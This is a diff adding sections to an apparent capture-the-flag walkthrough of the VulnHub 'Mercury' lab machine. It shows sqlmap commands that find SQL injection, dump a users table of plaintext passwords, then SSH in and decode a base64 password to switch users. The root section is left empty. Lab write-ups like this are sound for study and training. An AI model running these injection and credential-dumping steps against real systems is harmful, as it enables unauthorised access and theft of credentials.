@@ -12,7 +12,7 @@ You can find the machine there > [The Planets Mercury](https://www.vulnhub.com/e
 
 ## Summary
 
-This machine is quite easy, i have to admit that i stuck on privilege escalation for a while. Starting off with a sqlmap scan on the page we can grab some creds and brute force ssh with them, this will give us a low-privilege shell on the box. Second privesc is really easy we just have to decode some base64 data & the final privesc to root is tricky we have to think smart to exploit it.
+This machine is quite easy, i have to admit that i stuck on privilege escalation for a while. Starting off with a sqlmap scan on the page we can grab some creds and ssh with them, this will give us a low-privilege shell on the box. Second privesc is really easy we just have to decode some base64 data & the final privesc to root is tricky we have to think smart to exploit it.
 Let's start! :sunglasses:
 
 ## Enumeration/Reconnaissance
@@ -72,9 +72,110 @@ mercuryfacts/
 
 I browsed `/mercuryfacts` path & i noticed this message `Fact id: 1. (('Mercury does not have any moons or rings.',),)` under `Mercury Facts` link. Voilà! We can test for SQL Injection. Let's fire up sqlmap! :fire:
 
-## Shell as 
+## Shell as webmaster
 
+```
+$ sqlmap -u http://192.168.1.19:8080/mercuryfacts/ --dbs --batch
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.5#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
 
+..data..
 
+[21:30:48] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.1
+[21:30:49] [INFO] fetching database names
+[21:30:49] [INFO] retrieved: 'information_schema'
+[21:30:49] [INFO] retrieved: 'mercury'
+available databases [2]:                                                                                                                                                           
+[*] information_schema
+[*] mercury
+```
 
+Here we go, let's grab the tables now.
+
+```
+sqlmap -u http://192.168.1.19:8080/mercuryfacts/ -D mercury --tables --batch
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.5#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+..data..
+
+[21:33:32] [INFO] retrieved: 'facts'
+[21:33:32] [INFO] retrieved: 'users'
+Database: mercury                                                                                                                                                                  
+[2 tables]
++-------+
+| facts |
+| users |
++-------+
+```
+
+Let's get the data now from the `users` table.
+
+```
+$ sqlmap -u http://192.168.1.19:8080/mercuryfacts/ -D mercury -T users --dump --batch
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.5#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+..data..
+
+Database: mercury                                                                                                                                                                  
+Table: users
+[4 entries]
++------+-----------+-------------------------------+
+| id   | username  | password                      |
++------+-----------+-------------------------------+
+| 1    | john      | johnny1987                    |
+| 2    | laura     | lovemykids111                 |
+| 3    | sam       | lovemybeer111                 |
+| 4    | webmaster | mercuryisthesizeof0.056Earths |
++------+-----------+-------------------------------+
+```
+
+After some tries i found the right creds, `webmaster:mercuryisthesizeof0.056Earths` & we have shell.
+
+```
+$ ssh webmaster@$ip
+webmaster@192.168.1.19's password: 
+
+webmaster@mercury:~$ whoami;id
+webmaster
+uid=1001(webmaster) gid=1001(webmaster) groups=1001(webmaster)
+```
+
+## Shell as linuxmaster
+
+Enumerating the home folder, i noticed a directory called `mercury_proj`. I entered the directory and i found out 2 accounts under `notes.txt`:
+
+```
+Project accounts (both restricted):
+webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
+linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
+```
+
+I base64 decoded `linuxmaster` password and i got access!
+
+```
+webmaster@mercury:~/mercury_proj$ echo bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg== | base64 -d
+mercurymeandiameteris4880km
+webmaster@mercury:~/mercury_proj$ su - linuxmaster
+Password: 
+linuxmaster@mercury:~$ whoami;id
+linuxmaster
+uid=1002(linuxmaster) gid=1002(linuxmaster) groups=1002(linuxmaster),1003(viewsyslog)
+```
+
+## Shell as root
 
